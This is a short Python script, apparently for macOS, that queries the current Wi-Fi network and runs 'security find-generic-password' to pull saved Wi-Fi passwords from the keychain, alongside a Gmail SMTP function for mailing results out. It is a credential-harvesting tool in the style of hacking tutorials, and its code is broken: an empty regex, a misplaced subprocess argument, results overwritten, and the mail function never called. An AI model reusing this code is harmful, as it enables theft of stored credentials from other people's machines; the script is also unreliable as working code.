#!/usr/bin/env python
import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.close()


command = "/System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -I"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("", networks)

results = ""
for network_name in network_names_list:
    command = f'security find-generic-password -ga {network_name} | grep "password:"'
    current_result = subprocess.check_output(command, network_name)
    results = current_result

print(results)



